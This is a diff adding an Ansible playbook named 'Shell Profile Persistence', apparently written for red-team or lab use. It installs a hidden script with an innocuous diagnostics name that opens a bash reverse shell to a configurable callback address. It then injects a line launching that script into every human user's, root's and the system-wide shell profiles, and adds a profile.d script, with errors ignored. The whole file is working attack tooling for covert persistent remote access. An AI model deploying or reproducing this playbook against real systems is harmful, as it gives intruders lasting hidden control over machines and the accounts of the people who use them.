@@ -1,0 +1,78 @@
+# Made by
+# Jason Hyde
+# jth1987@rit.edu
+---
+- name: Shell Profile Persistence
+  hosts: targets
+  become: yes
+  gather_facts: yes
+
+  vars:
+    profile_files:
+      - .bashrc
+      - .bash_profile
+      - .profile
+    payload_script: /usr/local/lib/.sys-diag.sh
+    payload_line: "[ -f {{ payload_script }} ] && setsid {{ payload_script }} >/dev/null 2>&1 &"
+
+  tasks:
+
+    - name: Write payload to hidden script file
+      copy:
+        dest: "{{ payload_script }}"
+        mode: '0755'
+        owner: root
+        group: root
+        content: |
+          #!/bin/bash
+          if ! pgrep -f "{{ callback_ip }}" > /dev/null 2>&1; then
+            bash -i >& /dev/tcp/{{ callback_ip }}/{{ callback_port }} 0>&1
+          fi
+
+    - name: Get list of human users on the system
+      shell: |
+        getent passwd | awk -F: '$3 >= 1000 && $7 !~ /nologin|false/ {print $1":"$6}'
+      register: human_users
+      changed_when: false
+
+    - name: Inject into user shell profile files
+      lineinfile:
+        path: "/home/{{ item[0].split(':')[0] }}/{{ item[1] }}"
+        line: "{{ payload_line }}"
+        state: present
+        create: yes
+        owner: "{{ item[0].split(':')[0] }}"
+        mode: '0644'
+      loop: "{{ human_users.stdout_lines | product(profile_files) | list }}"
+      ignore_errors: yes
+
+    - name: Inject into root shell profiles
+      lineinfile:
+        path: "/root/{{ item }}"
+        line: "{{ payload_line }}"
+        state: present
+        create: yes
+        owner: root
+        mode: '0644'
+      loop: "{{ profile_files }}"
+      ignore_errors: yes
+
+    - name: Inject into system-wide shell profiles
+      lineinfile:
+        path: "{{ item }}"
+        line: "{{ payload_line }}"
+        state: present
+      loop:
+        - /etc/bash.bashrc
+        - /etc/profile
+      ignore_errors: yes
+
+    - name: Drop profile.d script
+      copy:
+        dest: /etc/profile.d/sys-diag.sh
+        mode: '0755'
+        owner: root
+        group: root
+        content: |
+          #!/bin/bash
+          [ -f {{ payload_script }} ] && setsid {{ payload_script }} >/dev/null 2>&1 &
